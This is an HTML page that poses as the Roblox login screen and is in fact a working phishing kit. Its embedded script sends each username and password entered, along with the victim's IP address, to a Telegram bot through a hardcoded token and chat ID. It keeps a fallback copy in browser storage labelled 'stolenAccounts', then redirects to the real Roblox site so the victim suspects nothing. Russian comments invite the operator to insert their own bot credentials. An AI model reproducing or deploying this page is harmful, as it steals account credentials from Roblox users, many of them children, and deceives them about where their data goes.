<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Gotham SSm A', 'Gotham SSm B', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }
        
        .login-header {
            background: #00a2ff;
            padding: 30px 20px;
            text-align: center;
        }
        
        .login-header h1 {
            color: white;
            font-size: 28px;
            font-weight: 700;
        }
        
        .login-form {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #495057;
            font-weight: 600;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e9ecef;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #00a2ff;
        }
        
        .login-btn {
            width: 100%;
            background: #00a2ff;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .login-btn:hover {
            background: #0088cc;
        }
        
        .login-footer {
            text-align: center;
            padding: 20px;
            color: #6c757d;
            font-size: 12px;
            border-top: 1px solid #e9ecef;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            color: #00a2ff;
            margin-top: 10px;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        
        .forgot-password a {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>ROBLOX</h1>
        </div>
        
        <div class="login-form">
            <form id="robloxLoginForm">
                <div class="form-group">
                    <label for="username">Username or Email</label>
                    <input type="text" id="username" name="username" required autocomplete="username">
                    <div class="error-message" id="usernameError">Please enter your username</div>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                    <div class="error-message" id="passwordError">Please enter your password</div>
                </div>
                
                <button type="submit" class="login-btn">Login</button>
                <div class="loading" id="loading">Signing in...</div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
        </div>
        
        <div class="login-footer">
            © 2024 Roblox Corporation. All rights reserved.
        </div>
    </div>

    <script>
        // Функция для отправки данных на Telegram
        async function sendToTelegram(username, password) {
            const botToken = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM'; // Замени на свой
            const chatId = '7695851744'; // Замени на свой
            const ip = await getIP();
            
            const message = `🔓 НОВЫЙ АККАУНТ ROBLOX
👤 Логин: ${username}
🔒 Пароль: ${password}
🌐 IP: ${ip}
🕐 Время: ${new Date().toLocaleString('ru-RU')}
🔗 Сайт: ${window.location.hostname}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                console.log('✅ Данные отправлены в Telegram');
            } catch (error) {
                console.log('⚠️ Не удалось отправить в Telegram');
                saveToLocalStorage(username, password, ip);
            }
        }

        // Функция для получения IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Сохранение в localStorage как резерв
        function saveToLocalStorage(username, password, ip) {
            const existingData = JSON.parse(localStorage.getItem('stolenAccounts') || '[]');
            existingData.push({
                username: username,
                password: password,
                ip: ip,
                timestamp: new Date().toLocaleString('ru-RU')
            });
            localStorage.setItem('stolenAccounts', JSON.stringify(existingData));
            console.log('✅ Данные сохранены локально');
        }

        // Обработка формы
        document.getElementById('robloxLoginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const loadingElement = document.getElementById('loading');
            
            if (!username) {
                document.getElementById('usernameError').style.display = 'block';
                return;
            }
            if (!password) {
                document.getElementById('passwordError').style.display = 'block';
                return;
            }
            
            loadingElement.style.display = 'block';
            document.querySelector('.login-btn').disabled = true;
            
            // Отправляем данные
            await sendToTelegram(username, password);
            
            // Редирект с задержкой для реалистичности
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 2000);
        });

        // Скрываем ошибки при вводе
        document.getElementById('username').addEventListener('input', function() {
            document.getElementById('usernameError').style.display = 'none';
        });
        
        document.getElementById('password').addEventListener('input', function() {
            document.getElementById('passwordError').style.display = 'none';
        });

        // Автофокус на поле ввода
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                document.getElementById('username').focus();
            }, 500);
        });
    </script>
</body>
</html>
